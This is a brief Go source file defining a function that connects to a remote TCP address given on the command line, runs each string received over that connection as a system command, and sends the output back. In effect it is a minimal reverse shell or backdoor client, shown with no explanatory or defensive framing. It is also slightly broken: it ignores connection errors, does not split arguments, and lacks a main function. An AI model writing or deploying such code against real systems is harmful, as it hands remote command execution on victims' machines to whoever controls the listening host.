package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func emit() {
	conn, err := net.Dial("tcp", os.Args[2])

	if err != nil {
		fmt.Println("Error connecting to the server")
	}

	for {
		buf := make([]byte, 1024)
		n, err := conn.Read(buf)
		data := string(buf[:n])
		if err == nil {
			out, _ := exec.Command(data).Output()
			conn.Write(out)
		}
	}
}
